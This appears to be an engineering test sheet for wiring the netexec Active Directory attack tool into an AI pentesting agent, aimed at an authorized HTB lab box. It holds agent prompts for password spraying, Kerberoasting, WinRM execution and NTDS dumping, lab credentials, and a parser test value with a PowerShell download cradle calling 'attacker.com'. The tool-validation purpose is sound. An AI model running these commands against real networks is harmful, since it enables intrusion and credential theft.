# netexec — Tier A scenarios

Single test sheet for the `netexec` tool migration (Wave 4.1 — first tool of
Wave 4, AD post-exploitation cluster).

netexec (NXC) is the modern fork of CrackMapExec — a **single binary**
(`netexec`; older alias `nxc`) with **sub-protocol architecture**:
`netexec <protocol> <target> [options...]`. Ten protocols supported:
smb / ldap / mssql / winrm / ssh / ftp / wmi / rdp / nfs / vnc. Each protocol
has its own flag set + module catalog. Targets are SECOND positional: single
IP, hostname, FQDN, IPv4 CIDR (idiomatic for credential spraying), or
multiple space-separated targets — `allow_multi_target: true` is set
because CIDR is the bread-and-butter use case.

This is structurally similar to impacket (multi-binary AD toolkit) in that
it covers many AD attacks under one CLI surface, but DIFFERENT in shape —
impacket has 47 sub-binaries on PATH; netexec has ONE binary with ten
sub-protocols selected by the first positional.

Sections:
1. Recommended HTB box for live verification
2. Narrative scenarios (paste into opensploit)
3. Target-extraction adversarial cases (≥20 — total 26)
4. Failure-signature live-verify cases (≥3 — total 6)
5. Open questions
6. Hand-off

---

## 1. Recommended HTB box

**Hercules (10.129.242.196)** — same Linux DC for `hercules.htb` used for
impacket testing. Why Hercules is right for netexec testing:

- **NTLM disabled domain-wide** — surfaces `STATUS_NOT_SUPPORTED` on SMB and
  WinRM, encoded as a netexec failure_signature. Forces the
  Kerberos / `--use-kcache` path to be exercised.
- **Kerberos available** — both pre-auth and AS-REP paths exercisable.
  `netexec ldap -k --kerberoasting /session/...` works against Hercules
  because LDAP doesn't depend on NTLM.
- **Real AD environment** — `--shares`, `--users`, `--groups`, `--computers`,
  `--ntds`, and the Kerberos roasting modules all exercise different
  dispatch paths in netexec.
- **WinRM open on a couple of accounts** — exercises the netexec WinRM
  limitation gotcha (NTLM only), which is unique to nxc and worth surfacing
  in failure_signature_tests.

Test credential pair: `hercules.htb/natalie.a:Prettyprincess123!` (per the
HTB writeups; valid as of the 2026-04-25 verification run for impacket).

**Persistent test directory**: mount `/tmp/nxc-test:/session` (per SKILL #14).
Multi-step flows like Kerberos roast (writes /session/kroast.txt) +
hashcat (reads /session/kroast.txt) need the same dir across calls.

---

## 2. Narrative scenarios (paste into opensploit)

### S1 — SMB null-session enum on Hercules (NTLM-disabled path)

```
Engagement target: 10.129.242.196 (HTB Hercules, authorized).
Use netexec smb 10.129.242.196 -u '' -p '' --shares --users to attempt a null session and enumerate shares + domain users. Record the response.
```

**Watch:** target=`10.129.242.196` extracted via positional_match (rule 1,
IPv4 shape regex). The protocol token `smb` is the FIRST positional but
does NOT match the IP/host shape regex, so it's correctly skipped. Hercules
has NTLM disabled → response classifies as `failure_in_output` matching
`STATUS_NOT_SUPPORTED`. The agent should NOT mistake this for "wrong
creds" — it's protocol disablement. Switch suggestion: get a TGT via
impacket-getTGT, then re-run with `-k --use-kcache`.

### S2 — LDAP Kerberoast against Hercules (Kerberos auth path)

```
Engagement target: 10.129.242.196 (HTB Hercules).
First, use impacket-getTGT with hercules.htb/natalie.a:Prettyprincess123! to write a ccache to /session/. Then export KRB5CCNAME=/session/natalie.a.ccache and run netexec ldap 10.129.242.196 -u natalie.a -p '' -k --use-kcache --kerberoasting /session/kroast.txt.
```

**Watch:** Two-step flow — getTGT from impacket writes ccache; nxc reads it
via KRB5CCNAME env. target=`10.129.242.196`. LDAP doesn't care about NTLM
disablement, so this path works on Hercules where SMB/WinRM auth fails.
Output writes $krb5tgs$ hashes to /session/kroast.txt for hashcat -m 13100.

### S3 — SMB password spray with --continue-on-success

```
Engagement target: 10.129.242.0/24 (CIDR, authorized).
Use netexec smb 10.129.242.0/24 -u svc.account -p 'Summer2025!' --continue-on-success --no-bruteforce to spray a single password across the entire /24 looking for hosts where the user authenticates. Stop is the default — without --continue-on-success, nxc would halt at the first [+] and miss all subsequent hosts.
```

**Watch:** target=`10.129.242.0/24` extracted (CIDR shape — regex
includes optional `/NN`). allow_multi_target: true permits this through
scope validation. Per-host results stream to stdout with [+]/[-] markers.
--no-bruteforce avoids cartesian product (when -u and -p are both files).

### S4 — WinRM PowerShell exec on a confirmed admin

```
Engagement target: 10.129.242.196 (HTB Hercules, authorized).
After SMB auth confirmed (Pwn3d!) for natalie.a, use netexec winrm 10.129.242.196 -u natalie.a -p 'Prettyprincess123!' -x 'whoami /all' to retrieve user privileges via WinRM.
```

**Watch:** target=`10.129.242.196`. -x value `'whoami /all'` is consumed
by value_flag (-x in value_flags). NTLM disabled → STATUS_NOT_SUPPORTED.
Failure classification: nxc winrm does NOT support Kerberos. Switch
suggestion (encoded in failure_signature): use evil-winrm with KRB5CCNAME.

### S5 — Failure: STATUS_NOT_SUPPORTED on NTLM (SMB layer)

```
Engagement target: 10.129.242.196 (HTB Hercules, NTLM disabled domain-wide).
Use netexec smb 10.129.242.196 -u natalie.a -p 'Prettyprincess123!' --shares to attempt SMB auth with valid creds. Verify the failure mode is NTLM disablement, not wrong password.
```

**Watch:** Output contains `STATUS_NOT_SUPPORTED`. Failure classified via
that signal. Distinct from STATUS_LOGON_FAILURE (wrong password). Agent
remediation: switch to Kerberos via getTGT + --use-kcache.

### S6 — Failure: connection refused (TCP layer, deliberate)

```
Engagement target: 10.129.242.196 port 1 (closed port, verifying TCP-layer error classification).
Use netexec smb 127.0.0.1 -u admin -p '' --port 1 --shares.
```

**Watch:** Output contains `Connection refused`. Failure classified.
Distinct from S5 (SMB layer) — exercises TCP-layer signature.

### S7 — CIDR multi-target enum (subnet share enumeration)

```
Engagement target: 10.129.242.0/24 (CIDR, authorized).
Use netexec smb 10.129.242.0/24 -u '' -p '' --shares --filter-shares READ,WRITE to walk every host in the /24 looking for anonymous-readable or writable shares. Confirms allow_multi_target: true is honoured.
```

**Watch:** target=`10.129.242.0/24`. Scope validation accepts the CIDR
because `allow_multi_target: true`. Per-host streaming output with
[+]/[-] markers. Hosts are walked up to --threads 256 concurrent.

### S8 — NTDS dump (post-exploitation, requires DA)

```
Engagement target: 10.129.242.196 (HTB Hercules DC).
Assuming Domain Admin creds via getTGT chain — use netexec smb 10.129.242.196 -u Administrator -p '' -k --use-kcache --ntds --log /session/ntds.log to attempt DCSync via DRSUAPI replication.
```

**Watch:** target=`10.129.242.196`. --ntds defaults to drsuapi (no value).
On Hercules the actual DA password isn't natalie.a — this scenario will
likely fail with rpc_s_access_denied / ERROR_DS_DRA_BAD_DN, exercising
that failure_signature. Agent should switch to vss method or escalate.

---

## 3. Target-extraction adversarial cases (26 total, ≥20 spec)

The netexec `tool.yaml` declares TWO `target_extraction` rules (first
match wins):

1. `positional_match` regex
   `^(?:(?:\d{1,3}\.){3}\d{1,3}(?:/\d{1,2})?|[a-zA-Z0-9][a-zA-Z0-9-]*(?:\.[a-zA-Z0-9-]+)+)$`,
   `parse_as: raw` — matches a positional with IPv4 / IPv4 CIDR / dotted
   FQDN shape. The protocol token (`smb`, `ldap`, `mssql`, ...) does NOT
   match because it has no dot, no slash, no IP shape.
2. `positional_match` regex `^\[[0-9a-fA-F:]+\](?::\d+)?$`,
   `parse_as: raw` — bracketed IPv6 fallback.

NO `first_non_flag_positional` fallback — it would extract the protocol
token (always wrong).

`value_flags` declares ~70 entries to prevent value-position strings
(passwords, hashes, commands, module options) from being mistaken for
targets — every flag whose value could shape-match the target regex is
enumerated.

### Happy-path cases — second positional shape match

| #  | Command (binary `netexec` omitted) | Expected target | Notes |
|----|---|---|---|
| 1  | `smb 10.129.242.196 -u admin -p ''` | `10.129.242.196` | SMB single IP |
| 2  | `ldap 10.129.242.196 -u natalie.a -p '' -k --kerberoasting /session/k.txt` | `10.129.242.196` | LDAP single IP — Kerberos |
| 3  | `mssql 10.10.10.50 -u sa -p 'sa' --local-auth -x 'whoami'` | `10.10.10.50` | MSSQL local-auth |
| 4  | `winrm 10.10.10.5 -u admin -H 31d6cfe0d16ae931b73c59d7e0c089c0 -x 'systeminfo'` | `10.10.10.5` | WinRM PTH |
| 5  | `ssh 10.10.10.5 -u root -p 'rootpass' -x 'id'` | `10.10.10.5` | SSH exec |
| 6  | `rdp 10.10.10.5 -u admin -p 'admin' --screenshot` | `10.10.10.5` | RDP screenshot |
| 7  | `wmi 10.10.10.5 -u admin -p 'admin' --wmi 'SELECT * FROM Win32_Process'` | `10.10.10.5` | WMI query |
| 8  | `ftp 10.10.10.5 -u anonymous -p 'a@b.c'` | `10.10.10.5` | FTP — `a@b.c` is -p value, not target |
| 9  | `smb dc01.corp.local -u admin -p 'p'` | `dc01.corp.local` | FQDN target — dotted shape matches |
| 10 | `ldap dc.hercules.htb -u natalie.a -p 'p' -k --use-kcache` | `dc.hercules.htb` | FQDN with .htb TLD |
| 11 | `smb 10.10.10.0/24 -u '' -p '' --shares` | `10.10.10.0/24` | IPv4 CIDR — `/24` captured intact |
| 12 | `smb 10.0.0.0/8 -u admin -p 'p'` | `10.0.0.0/8` | Larger CIDR |
| 13 | `smb [fe80::1] -u admin -p 'p'` | `[fe80::1]` | Bracketed IPv6 (rule 2) |
| 14 | `smb [fe80::1]:445 -u admin -p 'p'` | `[fe80::1]:445` | IPv6 + port |

### Adversarial — value-flag traps (commands / passwords / module options that LOOK like targets)

| #  | Command | Expected | Notes |
|----|---|---|---|
| 15 | `smb 10.10.10.5 -u user@corp.local -p 'p'` | `10.10.10.5` | -u value contains @; FQDN-shape value MUST NOT be picked. Verified: -u is in value_flags. |
| 16 | `smb 10.10.10.5 -u admin -p 'http://other.target/'` | `10.10.10.5` | -p value is URL-shape; -p in value_flags consumes it atomically. |
| 17 | `smb 10.10.10.5 -u admin -p 'p' -x 'whoami; cat \\\\10.10.10.99\\share\\file.txt'` | `10.10.10.5` | -x value contains an IP-shape `10.10.10.99` inside a UNC path. -x in value_flags consumes the whole quoted string. |
| 18 | `smb 10.10.10.5 -u admin -p 'p' -X 'iex (New-Object Net.WebClient).DownloadString(\"http://attacker.com/p.ps1\")'` | `10.10.10.5` | -X value contains URL with hostname; -X in value_flags consumes it. |
| 19 | `ldap 10.10.10.5 -u admin -p 'p' --asreproast /session/output.txt` | `10.10.10.5` | --asreproast value is a file path (`/session/output.txt`); not a target shape — but value_flag list defends regardless. |
| 20 | `ldap 10.10.10.5 -u admin -p 'p' --kerberoasting /session/kroast.txt` | `10.10.10.5` | Same shape as 19 — file path. |
| 21 | `smb 10.10.10.5 -u admin -p 'p' --ntds vss` | `10.10.10.5` | --ntds value `vss` is bare token (no IP/dot shape) — would not match anyway, but value_flag belt-and-braces. |
| 22 | `smb 10.10.10.5 -u admin -p 'p' --ntds drsuapi` | `10.10.10.5` | Same — `drsuapi` doesn't match. |
| 23 | `smb 10.10.10.5 -u admin -p 'p' -M spider_plus -o EXT=txt SHARE=ADMIN$ DIR=Windows\\System32` | `10.10.10.5` | -M value `spider_plus` and -o values consumed. NB: -o takes multiple positionals (KEY=VALUE space-separated) — DSL's value_flag consumes only the FIRST token after -o; the rest are loose positionals. They don't shape-match (no dots), so no false target. |
| 24 | `ldap 10.10.10.5 -u admin -p 'p' --get-sid S-1-5-21-1234567890-0987654321-1122334455-500` | `10.10.10.5` | --get-sid value (SID); not target-shape but value_flag defends. |
| 25 | `smb 10.10.10.5 -u admin -p 'p' -K /session/admin.ccache` | `10.10.10.5` | -K value (ccache file path); not target-shape. |
| 26 | `smb 10.10.10.5 10.10.10.6 -u admin -p 'p' --shares` | `10.10.10.5` (FIRST), `multi_target_detected=true` | Two positional IPs both match the shape regex — multi_target_detected fires. Plugin's `allow_multi_target: true` permits the call (CIDR is the canonical multi-target form, but explicit list is also valid). |

### Adversarial — security invariants & ambiguity

| #  | Command | Expected | Notes |
|----|---|---|---|
| F1 | `--help` | `target=null` | Top-level help. Tool runner bypasses scope check. |
| F2 | `-h` | `target=null` | Short alias. |
| F3 | `smb --help` | `target=null` | Per-protocol help. |
| F4 | `smb 10.10.10.5 -u admin -p 'p' --kdcHost dc.corp.local` | `10.10.10.5` | --kdcHost value is FQDN-shape — but in value_flags. The bare-IP target is the operational target, not the KDC. **Security invariant**: --kdcHost is auth/SPN-resolution, NOT scope. |
| F5 | `smb 10.10.10.5 -u admin -p 'p' --port 445` | `10.10.10.5` | --port value is a number, not target. |
| F6 | `smb` (no target) | `target=null` | argparse exits with required-positional error. |
| F7 | `smb -u admin -p ''` | `target=null` | Same — no positional after protocol. |
| F8 | `smb 10.10.10.5/24 -u '' -p '' --shares` | `10.10.10.5/24` | Edge case: not a true network CIDR (single /24 starting from .5) — netexec accepts it; regex captures intact. |
| F9 | `smb 10.10.10.5,10.10.10.6 -u admin -p 'p'` | `target=null` | Comma-separated form — netexec does NOT support comma lists (use space-separated multi-positional or CIDR). The regex requires a single host shape; comma list fails the match. |
| F10 | `smb localhost -u admin -p 'p'` | `target=null` | `localhost` has NO dots — fails the FQDN regex. **Known DSL gap** (Open Question 1). |
| F11 | `smb 10.10.10.5 -u admin -p 'p' --bloodhound -c All` | `10.10.10.5` | -c value `All` — bare token, no shape match anyway. |
| F12 | `ldap 10.10.10.5 -u admin -p 'p' -M obsolete -o YEAR=2000` | `10.10.10.5` | Module option YEAR=2000 — no shape match. |

---

## 4. Failure-signature live-verify cases (6 total, ≥3 spec)

Verify against the netexec container (rebuild during Wave 9 batch with
mcp-common 0.3.0 and python3-full base — Dockerfile fix landed today).

Layer diversity (SKILL #11) — 7 distinct verifiable layers represented in
`tool.yaml`'s `failure_signatures`. Live-verify the most common 6 below.

| # | Layer | Test | failure_signature `signal` | Status |
|---|---|---|---|---|
| 1 | DNS | `netexec smb nonexistent.invalid -u admin -p ''` | `Could not resolve` OR `Name or service not known` | PENDING live verify (Wave 9) |
| 2 | TCP | `netexec smb 127.0.0.1 -u admin -p '' --port 1` (closed port) | `Connection refused` | PENDING live verify |
| 3 | SMB / NTLM disablement | `netexec smb 10.129.242.196 -u natalie.a -p 'Prettyprincess123!' --shares` (Hercules NTLM disabled) | `STATUS_NOT_SUPPORTED` | PENDING live verify — UNIQUE to nxc and worth surfacing |
| 4 | SMB / wrong creds | `netexec smb <smb-target> -u nonexistent -p 'wrong' --shares` (any reachable SMB host with NTLM enabled) | `STATUS_LOGON_FAILURE` | PENDING live verify |
| 5 | Kerberos preauth | `netexec ldap 10.129.242.196 -u natalie.a -p 'wrong' -k` (after writing a wrong-pw ccache) | `KDC_ERR_PREAUTH_FAILED` | PENDING live verify |
| 6 | argparse | `netexec smb 10.10.10.5 -u admin -p 'p' --no-such-flag` | `error: unrecognized arguments` | PENDING live verify |

### Layer diversity (SKILL #11) — achieved

7 distinct verifiable layers documented in `failure_signatures`:
1. **DNS** (case 1)
2. **TCP** (case 2)
3. **SMB / NTLM** (case 3 — NTLM disablement; case 4 — wrong creds)
4. **Kerberos** (case 5 — preauth; service-principal-unknown also encoded)
5. **NTDS / DCERPC** (rpc_s_access_denied / ERROR_DS_DRA_BAD_DN — encoded
   for live verify on a non-DA user attempting --ntds)
6. **argparse** (case 6 — argument validation)
7. **Module loader** (Module .* failed / Could not run module — encoded;
   live-verifiable by passing a nonexistent -M name)

### Signals encoded but not yet live-verified

`STATUS_ACCESS_DENIED`, `STATUS_ACCOUNT_LOCKED_OUT`, `STATUS_ACCOUNT_DISABLED`,
`STATUS_PASSWORD_EXPIRED`, `KDC_ERR_C_PRINCIPAL_UNKNOWN`,
`KDC_ERR_S_PRINCIPAL_UNKNOWN`, `KRB_AP_ERR_SKEW`, `Dumped 0 NTDS`,
`Dumped 0 LSA`, `Dumped 0 SAM`, `Connection timed out`, `NetBIOSTimeout`,
`PyAsn1Error`, `BER length field`, `Exception while calling proto_flow`,
`nxc winrm only support NTLM`, `Invalid NTLM challenge received from server`,
`[REMOVED] Arg moved to`, `successful bind must be completed`,
`the following arguments are required`, `invalid choice`.

These exercise post-pilot when corresponding misconfigurations / scenarios
are reproducible.

---

## 5. Open questions

1. **`localhost` and bare-token hostnames (case F10)** — the FQDN regex
   requires at least one dot (`(?:\.[a-zA-Z0-9-]+)+`), so `localhost`,
   `WORKGROUP`, `dc01` (single-label) fail to extract. Workaround: agent
   uses `127.0.0.1` or fully-qualified hostname. Long-term fix: add a
   third positional_match rule with a more permissive shape, OR rely on
   `first_non_flag_positional` with a reject list — but the latter
   breaks because the protocol token would still be picked.
   **Decision deferred** to plugin DSL evolution.

2. **target_extraction precise rule (protocol+target two-positional pattern)**
   — the DSL evaluates positional_match against EACH positional
   independently, so there's no way to express "the positional AFTER the
   protocol token". Current shape-regex approach (require IPv4 / IPv4 CIDR
   / dotted FQDN / bracketed IPv6) is correct for HTB but rejects valid
   single-label hostnames (case F10). Consider a DSL extension:
   `positional_match` with an `index` field (e.g., index=2 to mean
   "second positional"). Recommended for plugin Phase 2.

3. **Recipe system retirement** — the original mcp-server.py loads dynamic
   recipes from `/session/tool_recipes/netexec/` (Feature 28). With
   kind:cli, the LLM writes argv directly and recipes are dead code under
   the run_cli path. Recipes still load for legacy method calls if the
   directory exists. Per REQ-TR-016, this is RETIRED for kind:cli.
   Document in tool.yaml gotchas — done.

4. **`-u file.txt -p file.txt` ambiguity** — netexec auto-detects a file
   path for -u and -p (treats as wordlist) IF the file exists at that
   path inside the container. If the file does NOT exist, the value is a
   literal user/password. cli_in_container has no way to know which
   interpretation netexec will pick — agent must pre-verify the path.
   Document in gotchas — done. Recommendation: pre-stat the path in the
   prompt setup.

5. **allow_multi_target plugin support** — verified by reading
   cli-in-container.ts (line 328: `extraction.multi_target_detected &&
   !toolDef.allow_multi_target`). Plugin checks `toolDef.allow_multi_target`
   at top level — confirmed CIDR will pass through. Live-verify in Wave 9
   with case 26 (two explicit positional IPs) and case 11 (CIDR).

6. **JSON output completeness (--json)** — the netexec `--json` flag is
   per-operation, NOT universal. Some operations (--users, --shares on
   recent versions) emit JSON; others ignore the flag. Documented in
   output_formats with `preferred: false`. Live-verify per protocol in
   Wave 9 to populate a definitive list.

7. **Per-protocol help_commands enumeration** — `netexec <protocol> --help`
   is the canonical reference for protocol-specific flags. tool.yaml
   declares help_commands for all 8 commonly-used protocols (smb / ldap /
   mssql / winrm / ssh / rdp / wmi / nfs unverified — only listed if the
   image's apt build supports it). FTP / VNC help omitted for brevity.

8. **Module catalog discovery (`-L` per protocol)** — `netexec smb -L`,
   `netexec ldap -L`, etc. list available modules. Each protocol has a
   different module set. Documented as help_commands. Live-verify the
   exact catalog in Wave 9 to populate `triggers` and routing.use_for
   with module-specific entries.

9. **BloodHound output trap** — `netexec ldap --bloodhound -c All` writes
   JSON to `/root/.nxc/logs/` INSIDE the container, not /session/. Files
   are wiped on container restart. Documented in gotchas — recommendation
   is to use the dedicated `bloodhound` MCP tool instead, or follow up
   with a bash `find ... -exec cp` to /session/. Same trap for RDP
   screenshots in /root/.nxc/screenshots/.

10. **Kerberos clock skew on kind:cli** — netexec's Dockerfile retains
    `libfaketime` and the entrypoint.sh wires FAKETIME from clock_offset.
    impacket's kind:cli image dropped libfaketime (per impacket scenarios
    open question 7); netexec keeps it because Kerberos auth is core to
    nxc and clock skew is a frequent failure on hardened DCs. Verify
    libfaketime survives the Dockerfile fix (python3-pip / python3-venv
    → python3-full) — should, since libfaketime is a separate apt
    package.

11. **Audit gap: silent admin-required failure detection.** The legacy
    `_detect_silent_admin_failure` helper returned a structured failure
    when an admin-required operation (-x / -X / --sam / --lsa / --ntds /
    --dpapi / --kerberos-keys) was requested AND auth produced [+] AND
    (Pwn3d!) was absent — netexec silently no-ops in this case with zero
    exit code and no error output. Under kind:cli there is no python
    wrapper to detect this state; the agent must manually check that
    (Pwn3d!) appears in output before trusting an admin-op result. Surfaced
    in tool.yaml gotchas (added this audit pass) but not enforced at
    runtime. **Decision deferred** — consider a plugin-side
    "expected_marker" assertion (e.g., `expect_output: "(Pwn3d!)"` when
    --sam/--ntds are present) for kind:cli tools that need post-auth
    capability checks.

12. **Audit gap: structured error_class / retryable / suggestions are
    lost under kind:cli.** The legacy `_classify_netexec_error` returned
    `(error_class, retryable, suggestions)` for each of ~25 distinct
    error patterns (auth / config / network / params / env / timeout).
    Under kind:cli only the raw stdout/stderr is returned; the agent
    relies on `failure_signatures` (now 31 signals after this audit) for
    pattern-match-driven remediation. This is a deliberate kind:cli
    design choice (per REQ-TR-016) — agents read the failure_signatures
    list themselves rather than receiving a pre-classified verdict. The
    legacy method handlers remain available as the rollback path for
    callers that want classified errors, per scenarios §6 hand-off.

13. **Audit gap: Kerberos config file pre-staging.** The legacy
    `_get_auth_env` copied `/session/config/krb5.conf` → `/etc/krb5.conf`
    when missing — set up implicitly by the impacket method handlers
    that run before netexec in a typical Kerberos flow. Under kind:cli
    this implicit setup is gone; if the agent invokes netexec with -k
    before any impacket call has staged /etc/krb5.conf, GSSAPI may emit
    KDC_ERR_S_PRINCIPAL_UNKNOWN even with a valid ccache. **Decision
    deferred** — either bake a permissive krb5.conf into the netexec
    image, or add an entrypoint.sh pre-step that copies from
    /session/config/ when present (mirrors the legacy behavior).
    Documented in tool.yaml gotchas (added this audit pass).

14. **Audit gap: empty-password requirement under kind:cli.** netexec
    REQUIRES `-p` even when blank — the legacy `_build_base_cmd` always
    appended `-p ""` if no password, hash, ccache, or --no-pass was
    given. Under kind:cli the LLM constructs argv directly; the
    target_extraction value_flags list includes `-p` so a blank value is
    consumed safely, but the LLM must remember to emit `-p ''`
    explicitly. Documented in tool.yaml gotchas (added this audit pass).
    **Decision deferred** — could add a tool-yaml-level "implicit_args"
    field (e.g., `implicit_args: ["-p", ""]` when no -p / -H / --no-pass
    seen) to make kind:cli forgiving of this nxc quirk.

---

## 6. Hand-off

- **Tool**: netexec (kind:cli, single binary `netexec`; older alias
  `nxc`). Sub-protocol architecture: `netexec <protocol> <target>
  [options...]` with 10 protocols (smb / ldap / mssql / winrm / ssh /
  ftp / wmi / rdp / nfs / vnc).
- **Status**: tool.yaml authored end-to-end (kind:mcp + kind:cli);
  scenarios.md written. **Dockerfile EDITED** — `python3 / python3-pip /
  python3-venv` replaced with `python3-full` (Kali-rolling-friendly per
  nikto / impacket / ffuf / nuclei / git-dumper / ssti convention).
  libfaketime retained (Kerberos clock-skew defence — netexec needs it
  more than impacket because nxc's primary auth path is Kerberos when
  NTLM is disabled).
- **mcp-server.py UNTOUCHED** — auto-inherits `run_cli` from BaseMCPServer
  (mcp-common 0.3.0); existing per-protocol method handlers (`smb`,
  `winrm`, `ldap`, `mssql`, `ssh`, `rdp`, `wmi`) preserved as the legacy
  / rollback path per SKILL #21. The methods carry rich error
  classification (auth vs op vs config vs network) that's NOT
  reconstructible from raw stdout — agents that want classified errors
  still call `mcp_tool netexec smb` rather than `cli_in_container netexec
  smb ...`. Both paths coexist.
- **Image**: `ghcr.io/silicon-works/mcp-tools-netexec:latest` — needs
  rebuild during Wave 9 batch to pick up mcp-common 0.3.0 AND the
  python3-full base. Image size unchanged (~800 MB — mostly Kali
  netexec deps).
- **target_extraction = TWO rules**: BOTH `positional_match`. Rule 1
  matches IPv4 / IPv4 CIDR / dotted FQDN. Rule 2 matches bracketed IPv6.
  NO `first_non_flag_positional` fallback — that would extract the
  protocol token (smb/ldap/etc.), which is never a target. Single-label
  hostnames (`localhost`, `WORKGROUP`) are an Open Question.
- **value_flags**: ~70 entries — every auth flag (-u/-p/-H/-d/-K/-k),
  every command/exec flag (-x/-X/--exec-method/--obfs), every module
  flag (-M/-o), every output flag (--log/--json/--asreproast/
  --kerberoasting), every spray-control flag
  (--continue-on-success/--no-bruteforce/--gfail-limit/--ufail-limit/
  --hfail-limit), and every protocol-specific flag whose value could
  shape-match a target (--kdcHost FQDN, --query, --base-dn).
- **reject_flags**: EMPTY — netexec has no dedicated bulk-target ingest
  flag (no -tF / --targets-file / --input-file). The positional <target>
  is dual-use (single host / CIDR / file path); file-path form is
  detected by the target_extraction shape regex returning null, which
  causes scope validation to flag the call. Documented in
  reject_flags_reason.
- **allow_multi_target: true** — CIDR is idiomatic credential spraying.
  Plugin's `cli_in_container.ts:328` reads `toolDef.allow_multi_target`
  to permit the call. Verified in source.
- **Wave 4.1**: first tool of Wave 4 (AD post-exploitation cluster).
  Tier A migration progress: 15 tools done after this (curl, sqlmap,
  impacket, nmap, ffuf, nuclei, nikto, john, hashcat, kerbrute, hydra,
  ssti, git-dumper, netexec). Wave 4 continues with certipy /
  bloodyad / pygpoabuse.
- **Live-verify pending**: paste S1-S8 against Hercules (and a /24 CIDR
  for S3/S7) during Wave 9 batch rebuild + e2e run. Verify failure
  signatures 1-6 live; verify target-extraction cases 1-26 + F1-F12
  with plugin unit tests. Confirm allow_multi_target: true permits
  CIDR through scope validation (case 11) and explicit multi-host
  (case 26).
- **Files removed**: `__pycache__/` (build artefact, not in git but
  present on disk — removed). NO `target_extraction_tests.md` and NO
  `failure_signature_tests.md` ever existed for netexec — directory
  was already on the simpler layout.

Authored: 2026-04-25 (Wave 4.1).
